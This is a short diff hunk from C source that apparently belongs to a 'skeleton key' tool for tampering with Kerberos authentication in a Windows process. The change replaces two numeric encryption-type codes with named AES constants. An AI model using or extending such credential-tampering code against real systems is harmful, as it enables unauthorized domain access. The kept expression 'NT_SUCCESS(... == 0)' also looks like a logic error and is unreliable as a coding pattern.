@@ -143,7 +143,7 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID, HANDLE hProcess)
 			CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
 			if (CDLocateCSystem != 0)
 			{
-				if ((NT_SUCCESS(CDLocateCSystem(0x11, &pCrypt_aes128))) && (NT_SUCCESS(CDLocateCSystem(0x12, &pCrypt_aes256) == 0)))
+				if ((NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_AES128, &pCrypt_aes128))) && (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_AES256, &pCrypt_aes256) == 0)))
 				{
 					PRINT_SUCCESS(L"Packages : AES128 : 0x%-016p | 0x%-016p : AES256\n", pCrypt_aes128, pCrypt_aes256);
 					if (
